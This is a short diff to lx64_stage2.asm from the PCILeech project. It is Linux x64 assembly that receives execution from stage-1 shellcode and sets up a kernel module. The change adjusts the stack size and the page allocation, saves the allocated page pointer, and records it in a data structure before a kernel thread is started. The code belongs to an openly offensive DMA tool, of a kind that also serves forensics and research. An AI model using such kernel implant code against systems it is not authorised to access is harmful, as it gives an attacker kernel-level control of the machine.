@@ -1,7 +1,7 @@
 ; lx64_stage2.asm : assembly to receive execution from stage1 shellcode.
 ; Compatible with Linux x64.
 ;
-; (c) Ulf Frisk, 2016, 2017
+; (c) Ulf Frisk, 2016-2024
 ; Author: Ulf Frisk, pcileech@frizk.net
 ;
 
@@ -64,7 +64,7 @@ main PROC
 	PUSH r15
 	MOV r15, rsp
 	AND rsp, 0FFFFFFFFFFFFFFF0h
-	SUB rsp, 020h
+	SUB rsp, 040h
 	LEA r14, main_pre_start
 	MOV eax, [data_offset_kallsyms_lookup_name]
 	ADD r14, rax
@@ -105,9 +105,10 @@ setup PROC
 	TEST rax, rax
 	JZ error
     alloc_pages_ok:
-	MOV rdi, 14h
-	MOV rsi, 2h
+	MOV rdi, 0cc4h
+	MOV rsi, 1h
 	CALL rax
+	MOV [rsp+30h], rax
 	TEST rax, rax
 	JZ error
 	; ----------------------------------------------------
@@ -185,8 +186,10 @@ setup PROC
 	; 5: START THREAD
 	; ----------------------------------------------------
 	thread_start:
-	MOV [r12+58h], rax   ; KMDDATA.ReservedKMD
+	MOV [r12+58h], rax   ; KMDDATA.ReservedKMD[0] (task_struct*)
 	MOV [r12+10h], r14   ; KMDDATA.AddrKallsymsLookupName
+	MOV rax, [rsp+30h]
+	MOV [r12+60h], rax   ; KMDDATA.ReservedKMD[1] (page*)
 	LEA rdi, str_wake_up_process
 	CALL r14
 	TEST rax, rax
